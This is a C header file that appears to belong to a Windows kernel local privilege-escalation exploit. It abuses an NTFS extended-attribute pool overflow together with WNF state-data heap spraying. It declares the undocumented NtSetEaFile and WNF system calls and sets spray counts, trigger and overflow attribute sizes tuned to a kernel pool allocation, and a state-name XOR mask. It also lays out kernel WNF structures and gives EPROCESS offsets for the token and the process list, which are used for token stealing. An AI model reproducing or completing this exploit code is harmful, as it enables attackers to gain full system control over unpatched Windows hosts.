#pragma once
typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;


typedef NTSTATUS(NTAPI*__ZwQueryEaFile)(
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	BOOLEAN          ReturnSingleEntry,
	PVOID            EaList,
	ULONG            EaListLength,
	PULONG           EaIndex,
	BOOLEAN          RestartScan
	);

typedef NTSTATUS(NTAPI*__ZwSetEaFile)(
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length
	);

typedef struct _FILE_FULL_EA_INFORMATION {
	ULONG  NextEntryOffset;
	UCHAR  Flags;
	UCHAR  EaNameLength;
	USHORT EaValueLength;
	CHAR   EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;



typedef struct _FILE_GET_EA_INFORMATION {
	ULONG NextEntryOffset;
	UCHAR EaNameLength;
	CHAR  EaName[1];
} FILE_GET_EA_INFORMATION, *PFILE_GET_EA_INFORMATION;


typedef struct _WNF_STATE_NAME {
	ULONG Data[2];
} WNF_STATE_NAME, *PWNF_STATE_NAME;

typedef enum _WNF_STATE_NAME_LIFETIME
{
	WnfWellKnownStateName,
	WnfPermanentStateName,
	WnfPersistentStateName,
	WnfTemporaryStateName
} WNF_STATE_NAME_LIFETIME;


typedef enum _WNF_DATA_SCOPE
{
	WnfDataScopeSystem,
	WnfDataScopeSession,
	WnfDataScopeUser,
	WnfDataScopeProcess,
	WnfDataScopeMachine
} WNF_DATA_SCOPE;


typedef struct _WNF_TYPE_ID
{
	GUID TypeId;
} WNF_TYPE_ID, *PWNF_TYPE_ID;


typedef const WNF_TYPE_ID *PCWNF_TYPE_ID;

typedef NTSTATUS  (NTAPI * __NtCreateWnfStateName)(
	_Out_ PWNF_STATE_NAME StateName,
	_In_ WNF_STATE_NAME_LIFETIME NameLifetime,
	_In_ WNF_DATA_SCOPE DataScope,
	_In_ BOOLEAN PersistData,
	_In_opt_ PCWNF_TYPE_ID TypeId,
	_In_ ULONG MaximumStateSize,
	_In_ PSECURITY_DESCRIPTOR SecurityDescriptor
);



typedef ULONG WNF_CHANGE_STAMP, *PWNF_CHANGE_STAMP;

typedef NTSTATUS (NTAPI * __NtUpdateWnfStateData)(
	_In_ PWNF_STATE_NAME StateName,
	_In_reads_bytes_opt_(Length) const VOID * Buffer,
	_In_opt_ ULONG Length,
	_In_opt_ PCWNF_TYPE_ID TypeId,
	_In_opt_ const PVOID ExplicitScope,
	_In_ WNF_CHANGE_STAMP MatchingChangeStamp,
	_In_ ULONG CheckStamp);



typedef NTSTATUS (NTAPI * __NtQueryWnfStateData)(
	_In_ PWNF_STATE_NAME StateName,
	_In_opt_ PWNF_TYPE_ID TypeId,
	_In_opt_ const VOID * ExplicitScope,
	_Out_ PWNF_CHANGE_STAMP ChangeStamp,
	_Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,
	_Inout_ PULONG BufferSize);



typedef struct _WNF_STATE_NAME_REGISTRATION
{
	PVOID64 MaxStateSize;
	PVOID64  TypeId;
	PVOID64 SecurityDescriptor;
}WNF_STATE_NAME_REGISTRATION, *PWNF_STATE_NAME_REGISTRATION;



typedef NTSTATUS
(NTAPI * __NtDeleteWnfStateData)
(
	_In_ PWNF_STATE_NAME StateName,
	_In_opt_ const VOID *ExplicitScope
);


typedef NTSTATUS (NTAPI * __NtDeleteWnfStateName)(_In_ PWNF_STATE_NAME StateName);

extern __ZwSetEaFile  NtSetEaFile;
extern __ZwQueryEaFile NtQueryEaFile;
extern __NtCreateWnfStateName NtCreateWnfStateName;
extern __NtUpdateWnfStateData NtUpdateWnfStateData;
extern __NtQueryWnfStateData NtQueryWnfStateData;
extern __NtDeleteWnfStateData NtDeleteWnfStateData;
extern __NtDeleteWnfStateName NtDeleteWnfStateName;

#define SPRAY_COUNT 10000
#define PAYLOAD_SIZE 1000





#define STATE_NAME_MASK 0x41C64E6DA3BC0074
#define TIGGER_EA_NAME ".PA"
#define OVER_EA_NAME ".PBB"

#define TIGGER_EA_NAME_LENGTH (UCHAR)(strlen(TIGGER_EA_NAME))
#define OVER_EA_NAME_LENGTH (UCHAR)(strlen(OVER_EA_NAME))


#define KERNAL_ALLOC_SIZE 0xae

#define FRIST_RAWSIZE ((KERNAL_ALLOC_SIZE) - (1)) 
#define TIGGER_EA_VALUE_LENGTH ((FRIST_RAWSIZE) - (TIGGER_EA_NAME_LENGTH) -(9))

// #define OVER_EA_VALUE_LENGTH (0x53 + 0x10)

#define OVER_EA_VALUE_LENGTH (0xf)

//#define OVER_STATENAME (0x517131)

#define OVER_STATEDATA_LENGTH 0x1000
 
extern UINT64 OVER_STATENAME ;
// extern UINT64 TIGGER_STATENAME;
#define TIGGER_STATENAME ((OVER_STATENAME) ^ (0x41C64E6DA3BC0074))
#define PROCESS_LIST_ENTRY_OFFSET 0x248 
//NumberOfPrivatePages
#define IMAGE_FILE_NAME_OFFSET 0x398  

struct _WNF_NODE_HEADER
{
	USHORT NodeTypeCode;                                                    //0x0
	USHORT NodeByteSize;                                                    //0x2
};

struct _EX_RUNDOWN_REF
{
	union
	{
		ULONGLONG Count;                                                    //0x0
		VOID* Ptr;                                                          //0x0
	};
};

struct _RTL_BALANCED_NODE
{
	union
	{
		struct _RTL_BALANCED_NODE* Children[2];                             //0x0
		struct
		{
			struct _RTL_BALANCED_NODE* Left;                                //0x0
			struct _RTL_BALANCED_NODE* Right;                               //0x8
		};
	};
	union
	{
		struct
		{
			UCHAR Red : 1;                                                    //0x10
			UCHAR Balance : 2;                                                //0x10
		};
		ULONGLONG ParentValue;                                              //0x10
	};
};

struct _WNF_STATE_NAME_STRUCT
{
	ULONGLONG Version : 4;                                                    //0x0
	ULONGLONG NameLifetime : 2;                                               //0x0
	ULONGLONG DataScope : 4;                                                  //0x0
	ULONGLONG PermanentData : 1;                                              //0x0
	ULONGLONG Sequence : 53;                                                  //0x0
};

struct _EX_PUSH_LOCK
{
	union
	{
		struct
		{
			ULONGLONG Locked : 1;                                             //0x0
			ULONGLONG Waiting : 1;                                            //0x0
			ULONGLONG Waking : 1;                                             //0x0
			ULONGLONG MultipleShared : 1;                                     //0x0
			ULONGLONG Shared : 60;                                            //0x0
		};
		ULONGLONG Value;                                                    //0x0
		VOID* Ptr;                                                          //0x0
	};
};

struct _WNF_LOCK
{
	struct _EX_PUSH_LOCK PushLock;                                          //0x0
};

struct _RTL_AVL_TREE
{
	struct _RTL_BALANCED_NODE* Root;                                        //0x0
};

struct _WNF_SCOPE_INSTANCE
{
	struct _WNF_NODE_HEADER Header;                                         //0x0
	struct _EX_RUNDOWN_REF RunRef;                                          //0x8
	enum _WNF_DATA_SCOPE DataScope;                                         //0x10
	ULONG InstanceIdSize;                                                   //0x14
	VOID* InstanceIdData;                                                   //0x18
	struct _LIST_ENTRY ResolverListEntry;                                   //0x20
	struct _WNF_LOCK NameSetLock;                                           //0x30
	struct _RTL_AVL_TREE NameSet;                                           //0x38
	VOID* PermanentDataStore;                                               //0x40
	VOID* VolatilePermanentDataStore;                                       //0x48
};




struct _WNF_STATE_DATA
{
	struct _WNF_NODE_HEADER Header;                                         //0x0
	ULONG AllocatedSize;                                                    //0x4
	ULONG DataSize;                                                         //0x8
	ULONG ChangeStamp;                                                      //0xc
};



typedef struct _WNF_NAME_INSTANCE
{
	 _WNF_NODE_HEADER Header;                                         //0x0
	 _EX_RUNDOWN_REF RunRef;                                          //0x8
	 _RTL_BALANCED_NODE TreeLinks;                                    //0x10
	 _WNF_STATE_NAME_STRUCT StateName;                                //0x28
	 _WNF_SCOPE_INSTANCE* ScopeInstance;                              //0x30
	 _WNF_STATE_NAME_REGISTRATION StateNameInfo;                      //0x38
	 _WNF_LOCK StateDataLock;                                         //0x50
	 _WNF_STATE_DATA* StateData;                                      //0x58
	ULONG CurrentChangeStamp;                                               //0x60
	VOID* PermanentDataStore;                                               //0x68
	struct _WNF_LOCK StateSubscriptionListLock;                             //0x70
	struct _LIST_ENTRY StateSubscriptionListHead;                           //0x78
	struct _LIST_ENTRY TemporaryNameListEntry;                              //0x88
	PVOID  CreatorProcess;                                       //0x98
	LONG DataSubscribersCount;                                              //0xa0
	LONG CurrentDeliveryCount;                                              //0xa4
}WNF_NAME_INSTANCE, *PWNF_NAME_INSTANCE;



#define PROCESS_ID_OFFSET 0x1b8

#define TOKEN_OFFSET 0x320

#define PROCESS_LIST_OFFSET 0x2f0












